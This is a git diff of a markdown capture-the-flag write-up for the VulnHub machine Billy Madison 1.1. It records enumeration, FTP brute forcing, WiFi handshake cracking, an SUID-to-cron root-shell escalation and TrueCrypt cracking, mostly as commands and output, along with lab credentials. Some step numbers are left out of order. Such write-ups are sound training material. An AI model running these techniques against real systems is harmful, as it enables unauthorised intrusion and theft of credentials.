@@ -11,9 +11,7 @@ image:
 ---
 
 # Recon
-
 ## NMAP Complete Scan
-
 ```
 ┌──(root💀kali)-[~/vulnHub/Billy_Madison_1.1/192.168.110.34]
 └─# cat scans/_full_tcp_nmap.txt 
@@ -105,9 +103,7 @@ OS and Service detection performed. Please report any incorrect results at https
 ```
 
 ## TCP/80 (HTTP)
-
 ### FFUF
-
 ```
 ┌──(root💀kali)-[~/vulnHub/Billy_Madison_1.1]
 └─# ffuf -u http://$ip/FUZZ -w /usr/share/wordlists/dirb/common.txt -e '.html,.txt,.php,.cgi,.log'
@@ -137,13 +133,10 @@ index.php               [Status: 200, Size: 937, Words: 96, Lines: 25]
 manual                  [Status: 301, Size: 317, Words: 20, Lines: 10]
 :: Progress: [27690/27690] :: Job [1/1] :: 460 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
 ```
-
 - `index.php`
 
 ## TCP/139,445 (SMB)
-
 ### Enum4linux
-
 ``` 
  ----------------------------------------
 |    Shares via RPC on 192.168.110.34    |
@@ -160,11 +153,9 @@ IPC$:
 [+] Mapping: OK, Listing: OK
 [*] Testing share IPC$
 ```
-
 - `EricsSecretStuff`
 
 ### Crackmapexec
-
 ``` 
 ┌──(root💀kali)-[~/vulnHub/Billy_Madison_1.1/192.168.110.34/loot]
 └─# crackmapexec smb $ip -u ' ' -p ' ' --shares
@@ -177,41 +168,36 @@ SMB         192.168.110.34  445    BM               EricsSecretStuff READ
 SMB         192.168.110.34  445    BM               IPC$                            IPC Service (BM)
 
 ```
-
 -  `EricsSecretStuff` - READ
+
 
 # Initial Foothold
 
 ## TCP/23 (Telnet) - Cryptography
-
 1. Access telnet
-
 	``` 
 	┌──(root💀kali)-[~/vulnHub/Billy_Madison_1.1]
 	└─# nc $ip 23 | tee telnet.txt
 	
 	***** HAHAH! You're banned for a while, Billy Boy!  By the way, I caught you trying to hack my wifi - but the joke's on you! I don't use ROTten passwords like rkfpuzrahngvat anymore! Madison Hotels is as good as MINE!!!! *****
 	```
-
 	- `rkfpuzrahngvat`
 	- `ROTten`
 		- [ROT](https://en.wikipedia.org/wiki/ROT13) substitution cipher
 2. Identify ciphertext
 	![](Pasted%20image%2020220221230702.png)
 3. Decipher it
-
 	``` 
 	┌──(root💀kali)-[~/vulnHub/Billy_Madison_1.1/192.168.110.34/exploit]
 	└─# echo rkfpuzrahngvat | rot13
 	exschmenuating
 	```
-
 	- Password/Directory?
 
+
+
 ## TCP/139,445 (SMB) - Rabbit Hole
-
 1. Download all files from `EricsSecretStuff` fileshare
-
 	``` 
 	┌──(root💀kali)-[~/vulnHub/Billy_Madison_1.1/192.168.110.34/loot/smb]
 	└─# smbclient //$ip/EricsSecretStuff -c 'prompt;recurse;mget *'
@@ -220,15 +206,12 @@ SMB         192.168.110.34  445    BM               IPC$                        
 	getting file \ebd.txt of size 35 as ebd.txt (17.1 KiloBytes/sec) (average 224.1 KiloBytes/sec)
 	getting file \.DS_Store of size 6148 as .DS_Store (600.4 KiloBytes/sec) (average 358.5 KiloBytes/sec)
 	```
-
 2. View files
 	![](Pasted%20image%2020220221221922.png)
 3. Proceed to `TCP/69`
 
 ## TCP/69 (HTTP) - Rabbit Hole
-
 1. Find out the service running @ `TCP/69`
-
 	``` 
 	┌──(root💀kali)-[~/vulnHub/Billy_Madison_1.1/192.168.110.34/loot/http]
 	└─# nc $ip 69
@@ -243,11 +226,9 @@ SMB         192.168.110.34  445    BM               IPC$                        
 	<p>Error code explanation: 400 = Bad request syntax or unsupported method.
 	</body>
 	```
-
 	- HTTP
 2. [Fix](https://thegeekpage.com/err-unsafe-port/) `ERR UNSAFE PORT`
 3.  FFUF
-
 	``` 
 	┌──(root💀kali)-[~/vulnHub/Billy_Madison_1.1/192.168.110.34/loot/http]
 	└─# ffuf -u http://$ip:69/FUZZ -w /usr/share/wordlists/dirb/common.txt -e '.txt,.php,.html'
@@ -280,11 +261,9 @@ SMB         192.168.110.34  445    BM               IPC$                        
 	xmlrpc.php              [Status: 200, Size: 42, Words: 6, Lines: 1]
 	:: Progress: [18460/18460] :: Job [1/1] :: 811 req/sec :: Duration: [0:00:26] :: Errors: 0 
 	```
-
 	- Wordpress CMS
-4. Enumerate wordpress
+5. Enumerate wordpress
 	1. Enumerate wordpress version & users
-
 		``` 
 		┌──(root💀kali)-[~/vulnHub/Billy_Madison_1.1/192.168.110.34/loot/http]
 		└─# wpscan --no-update --disable-tls-checks --url http://$ip:69 -e u -f cli-no-color 2>&1 | tee "/root/vulnHub/Billy_Madison_1.1/192.168.110.34/scans/tcp69/tcp_69_http_wpscan.txt"
@@ -295,21 +274,18 @@ SMB         192.168.110.34  445    BM               IPC$                        
 		 | Found By: Author Posts - Display Name (Passive Detection)
 		 | Confirmed By: Author Id Brute Forcing - Display Name (Aggressive Detection)
 		```
-
 	2. Enumerate wordpress plugins
-
 		``` 
 		┌──(root💀kali)-[~/vulnHub/Billy_Madison_1.1/192.168.110.34/loot/http]
 		└─# wpscan --no-update --disable-tls-checks --plugins-detection aggressive --plugins-version-detection aggressive --url http://$ip:69 -e ap -f cli-no-color 2>&1 | tee "/root/vulnHub/Billy_Madison_1.1/192.168.110.34/scans/tcp69/tcp_69_http_wpscan_plugins.txt"
 
 		[i] No plugins Found.
 		```
-
 5. Proceed to `exschmenuating`, does not exist
 6. `TCP/69` is a rabbithole
 
-## TCP/80 (HTTP) - Directory Enumeration
 
+## TCP/80 (HTTP) - Directory Enumeration
 1. Proceed to `http://192.168.110.34/index.php`
 	![](Pasted%20image%2020220221222213.png)
 2. Proceed to `exschmenuating`
@@ -318,14 +294,11 @@ SMB         192.168.110.34  445    BM               IPC$                        
 	- `captured` suggests it is a `.pcap`,`cap`,`.captured` file
 	- `veronica` as part of her passwords
 3. Create a wordlist (`veronica.txt`) by extracting veronica from `rockyou.txt`
-
 	``` 
 	┌──(root💀kali)-[~/vulnHub/Billy_Madison_1.1/192.168.110.34/exploit]
 	└─# cat /usr/share/wordlists/rockyou.txt | grep veronica > veronica.txt
 	```
-
 4. FFUF
-
 	``` 
 	┌──(root💀kali)-[~/vulnHub/Billy_Madison_1.1/192.168.110.34/exploit]
 	└─# ffuf -u http://192.168.110.34/exschmenuating/FUZZ -w veronica.txt -e '.pcap,.cap,.captured,.html,.php'
@@ -353,16 +326,13 @@ SMB         192.168.110.34  445    BM               IPC$                        
 	012987veronica.cap      [Status: 200, Size: 8700, Words: 353, Lines: 193]
 	:: Progress: [4638/4638] :: Job [1/1] :: 102 req/sec :: Duration: [0:00:04] :: Errors: 6 ::
 	```
-
 	- `012987veronica.cap`
 
 ## Wireshark Analysis
-
 1. `012987veronica.cap` captured email conversation between Veronica & Eric. 
-2. Mail 2 and 3 contains interesting information
-3. View the conversation w/ filter: `tcp.stream eq 0-5`
+3. Mail 2 and 3 contains interesting information
+4. View the conversation w/ filter: `tcp.stream eq 0-5`
 	- Mail 2:
-
 		``` 
 		EHLO kali
 		MAIL FROM:<vvaughn@polyfector.edu>
@@ -387,13 +357,11 @@ SMB         192.168.110.34  445    BM               IPC$                        
 		.
 		QUIT
 		```
-
 		- `Spanish Armada combo`
 		- The video contains the port knocking sequence. 
 			- From `0:27 - 0:46`
 			- `1466, 67, 1469, 1514, 1981, 1986`
 	- Mail 3
-
 		``` 
 		EHLO kali
 		MAIL FROM:<eric@madisonhotels.com>
@@ -414,13 +382,10 @@ SMB         192.168.110.34  445    BM               IPC$                        
 		.
 		QUIT
 		```
-
 		- eric:ericdoesntdrinkhisownpee.
 
 ## Port Knocking
-
 1. Port Knock
-
 	``` 
 	┌──(root💀kali)-[~/vulnHub/Billy_Madison_1.1/192.168.110.34/exploit/wireshark]
 	└─# knock -v $ip 1466 67 1469 1514 1981 1986
@@ -431,9 +396,7 @@ SMB         192.168.110.34  445    BM               IPC$                        
 	hitting tcp 192.168.110.34:1981
 	hitting tcp 192.168.110.34:1986
 	```
-
 2. Check for newly opened ports
-
 	``` 
 	┌──(root💀kali)-[~/vulnHub/Billy_Madison_1.1]
 	└─# nmap $ip -p-
@@ -450,13 +413,10 @@ SMB         192.168.110.34  445    BM               IPC$                        
 	2525/tcp open   ms-v-worlds
 	MAC Address: 08:00:27:D8:4B:D5 (Oracle VirtualBox virtual NIC)
 	```
-
 	- `TCP/21`
 
 ## TCP/21 (FTP)
-
 1. Access FTP w/ eric:ericdoesntdrinkhisownpee, check for write access
-
 	``` 
 	┌──(root💀kali)-[~/vulnHub/Billy_Madison_1.1/192.168.110.34/exploit/wireshark]
 	└─# ftp $ip
@@ -488,14 +448,11 @@ SMB         192.168.110.34  445    BM               IPC$                        
 	-rwxrwxrwx 1 ftp 0 Feb 21 22:15 test
 	226 Transfer completed.
 	```
-
 2. Download all files
-
 	``` 
 	┌──(root💀kali)-[~/vulnHub/Billy_Madison_1.1/192.168.110.34/loot/ftp]
 	└─# wget -m --no-passive ftp://eric:ericdoesntdrinkhisownpee@$ip
 	```
-
 3. View the files
 	- `.notes`
 		![](Pasted%20image%2020220223205335.png)
@@ -505,9 +462,7 @@ SMB         192.168.110.34  445    BM               IPC$                        
 		- WiFi Password from Veronica's FTP folders.
 
 ## TCP/2525 (SMTP)
-
 1. Send an email to Eric
-
 	``` 
 	┌──(root💀kali)-[~/vulnHub/Billy_Madison_1.1/192.168.110.34/loot/http]
 	└─# telnet $ip 2525
@@ -528,9 +483,7 @@ SMB         192.168.110.34  445    BM               IPC$                        
 	221 Bye
 	Connection closed by foreign host.
 	```
-
 2. Check for newly opened ports
-
 	``` 
 	┌──(root💀kali)-[~/vulnHub/Billy_Madison_1.1/192.168.110.34/loot/http]
 	└─# nmap $ip -v -p-
@@ -549,18 +502,14 @@ SMB         192.168.110.34  445    BM               IPC$                        
 	2525/tcp open   ms-v-worlds
 	MAC Address: 08:00:27:D8:4B:D5 (Oracle VirtualBox virtual NIC)
 	```
-
 	- `TCP/1974`
 
 ## TCP/1974 (SSH)
-
 1. Failed to SSH w/ eric:ericdoesntdrinkhisownpee
 2. Earlier, Eric mentioned that we are able to login w/ his WiFi password, and it could be in Veronica's FTP Folder. Veronica is likely to use a password based off her name.
 
 ## TCP/21(FTP) - Bruteforce
-
 1. Bruteforce FTP against `veronica.txt` wordlist
-
 	``` 
 	┌──(root💀kali)-[~/vulnHub/Billy_Madison_1.1/192.168.110.34/exploit]
 	└─# hydra -l veronica -P veronica.txt -e nsr ftp://$ip
@@ -573,15 +522,12 @@ SMB         192.168.110.34  445    BM               IPC$                        
 	1 of 1 target successfully completed, 1 valid password found
 	Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-02-23 21:09:43
 	```
-
 	- veronica:babygirl_veronica07@yahoo.com
 2. Download all files 
-
 	``` 
 	┌──(root💀kali)-[~/vulnHub/Billy_Madison_1.1/192.168.110.34/loot/veronica_ftp]
 	└─# wget -m --no-passive ftp://veronica:babygirl_veronica07%40yahoo.com@$ip
 	```
-
 3. View files
 	- `email-from-billy.eml`
 	![](Pasted%20image%2020220223214116.png)
@@ -589,18 +535,14 @@ SMB         192.168.110.34  445    BM               IPC$                        
 		- packet capture file
 
 ## Crack .cap file
-
 1. `eg-01.cap` captured WiFi traffic
-
 	``` 
 	┌──(root💀kali)-[~/vulnHub/Billy_Madison_1.1/192.168.110.34/loot/veronica_ftp/192.168.110.34]
 	└─# tcpdump -r eg-01.cap 
 	reading from file eg-01.cap, link-type IEEE802_11 (802.11), snapshot length 65535
 	```
-
 	- [`IEEE802_11`](https://www.electronics-notes.com/articles/connectivity/wifi-ieee-802-11/what-is-wifi.php#:~:text=The%20technical%20name%20for%20WiFi,devices%20from%20a%20router%20%2F%20hotspot.&text=Wi-Fi%20wireless%20connectivity%20is%20an%20established%20part%20of%20everyday%20life.)
 2. Crack `eg-01.cap` w/ `aircrack-ng`
-
 	``` 
 	┌──(root💀kali)-[~/vulnHub/Billy_Madison_1.1/192.168.110.34/loot/veronica_ftp/192.168.110.34]
 	└─# aircrack-ng eg-01.cap -w /usr/share/wordlists/rockyou.txt 
@@ -625,13 +567,10 @@ SMB         192.168.110.34  445    BM               IPC$                        
       EAPOL HMAC     : 86 63 53 4B 77 52 82 0C 73 4A FA CA 19 79 05 33 
 
 	```
-
 	![](Pasted%20image%2020220223220417.png)
-
 	- eric:triscuit*
 
 ## TCP/1974 (SSH)
-
 1. SSH w/ eric:triscuit*
 	![](Pasted%20image%2020220223221419.png)
 	
@@ -640,9 +579,7 @@ SMB         192.168.110.34  445    BM               IPC$                        
 # Privilege Escalation
 
 ## Root - Via SUID Binary
-
 1. Enumerate SUID binaries
-
 	``` 
 	eric@BM:/tmp$ find / -perm -4000 2>/dev/null 
 	/usr/local/share/sgml/donpcgd
@@ -671,23 +608,19 @@ SMB         192.168.110.34  445    BM               IPC$                        
 	/bin/ntfs-3g
 	eric@BM:/tmp$ 
 	```
-
 	- `/usr/local/share/sgml/donpcgd`, is an unknown binary
 2. Execute `/usr/local/share/sgml/donpcgd` to see what it does
-
 	``` 
 	eric@BM:/tmp$ /usr/local/share/sgml/donpcgd
 	Usage: /usr/local/share/sgml/donpcgd path1 path2
 	eric@BM:/tmp$ 
 	```
-
 	- Able to specify 2 paths
 3. `/usr/local/share/sgml/donpcgd` allows us to create a file that has the same permissions as `path1` anywhere
 	- `path1`: file created will have the same permission as the specified file.
 	- `path2`: path where you want the file to be created
 	- The file created is empty
 4. Test our theory
-
 	``` 
 	eric@BM:/tmp$ ls -l /etc/passwd
 	-rw-r--r-- 1 root root 1717 Aug 20  2016 /etc/passwd # take note of the permission
@@ -701,9 +634,7 @@ SMB         192.168.110.34  445    BM               IPC$                        
 	-rw-r--r--  1 root root      0 Feb 22 02:08 testing1 # same permissions as /etc/passwd
 	...
 	```
-
 5. Obtain root by creating a writable file at `/etc/cron.hourly`, that will create a root shell.
-
 	``` 
 	eric@BM:/tmp$ touch /tmp/test
 	eric@BM:/tmp$ /usr/local/share/sgml/donpcgd /tmp/test /etc/cron.hourly/rootbash
@@ -716,11 +647,8 @@ SMB         192.168.110.34  445    BM               IPC$                        
 	total 4
 	-rwsrwxrwx 1 eric eric 67 Feb 22 04:26 rootbash
 	```
-
 	![](Pasted%20image%2020220224020112.png)
-
 6. Wait for cronjob to execute
-
 	``` 
 	eric@BM:/tmp$ ls -la
 	total 4944
@@ -730,19 +658,14 @@ SMB         192.168.110.34  445    BM               IPC$                        
 	-rwsr-xr-x  1 root root 1037528 Feb 22 05:17 rootbash
 	...
 	```
-
 7. Obtain root
-
 	``` 
 	eric@BM:/tmp$ /tmp/rootbash -p
 	```
-
 	![](Pasted%20image%2020220224025933.png)
 
 # /PRIVATE - Crack Truecrypt Volume
-
 1. View files in `/PRIVATE/`
-
 	``` 
 	root@BM:/PRIVATE# ls -la
 	total 1036
@@ -752,10 +675,8 @@ SMB         192.168.110.34  445    BM               IPC$                        
 	-rw-r--r--  1 root  root      221 Aug 29  2016 hint.txt
 	root@BM:/PRIVATE# 
 	```
-
 2. View files
 	- `hint.txt`
-
 		``` 
 		root@BM:/PRIVATE# cat hint.txt 
 		Heh, I called the file BowelMovement because it has the same initials as
@@ -768,19 +689,15 @@ SMB         192.168.110.34  445    BM               IPC$                        
 		-EG
 		root@BM:/PRIVATE# 
 		```
-
 		- `That truely cracks me up!`
 	- `BowelMovement`
 		- Truecrypt volume, based on `hint.txt`, `truely cracks me up!`
 3. Create a wordlist from the wikipedia link
-
 	``` 
 	┌──(root💀kali)-[~/vulnHub/Billy_Madison_1.1/192.168.110.34/exploit]
 	└─# cewl https://en.wikipedia.org/wiki/Billy_Madison -w wiki.txt -d 0 -v
 	```
-
 4. Crack `BowelMovement` w/ truecrack
-
 	``` 
 	┌──(root💀kali)-[~/vulnHub/Billy_Madison_1.1/192.168.110.34/loot]
 	└─# truecrack -t BowelMovement -w ../exploit/wiki.txt 
@@ -791,28 +708,20 @@ SMB         192.168.110.34  445    BM               IPC$                        
 	Password length:	"10"
 	Total computations:	"744"
 	```
-
 5. Download `veracrypt` to mount `BowelMovement`
 	1. Download `veracrypt-1.25.9-setup.tar.bz2`
-
 		``` 
 		wget https://launchpad.net/veracrypt/trunk/1.25.9/+download/veracrypt-1.25.9-setup.tar.bz2
 		```
-
 	2. Extract
-
 		``` 
 		tar -xf veracrypt-1.25.9-setup.tar.bz2
 		```
-
 	3. Run setup
-
 		``` 
 		./veracrypt-1.25.9-setup-console-x64
 		```
-
-6. Mount `BowelMovement`
-
+1. Mount `BowelMovement`
 	``` 
 	┌──(root💀kali)-[~/vulnHub/Billy_Madison_1.1/192.168.110.34/loot]
 	└─# mkdir billy
@@ -822,9 +731,7 @@ SMB         192.168.110.34  445    BM               IPC$                        
 	Enter keyfile [none]: 
 	Protect hidden volume (if any)? (y=Yes/n=No) [No]: n
 	```
-
 7. View directory structure of `billy` 
-
 	``` 
 	┌──(root💀kali)-[~/vulnHub/Billy_Madison_1.1/192.168.110.34/loot]
 	└─# tree -a billy/
@@ -835,13 +742,11 @@ SMB         192.168.110.34  445    BM               IPC$                        
 
 	1 directory, 2 files
 	```
-
 8. Unzip `secret.zip`
 9. View extracted files
 	- `Billy_Madison_12th_Grade_Final_Project.doc`
 		![](Pasted%20image%2020220224023455.png)
 	- `THE-END.txt`
-
 		``` 
 		┌──(root💀kali)-[~/vulnHub/Billy_Madison_1.1/192.168.110.34/loot/billy]
 		└─# cat THE-END.txt 
@@ -862,3 +767,4 @@ SMB         192.168.110.34  445    BM               IPC$                        
 		7 Minute Security
 		www.7ms.us
 		```
+
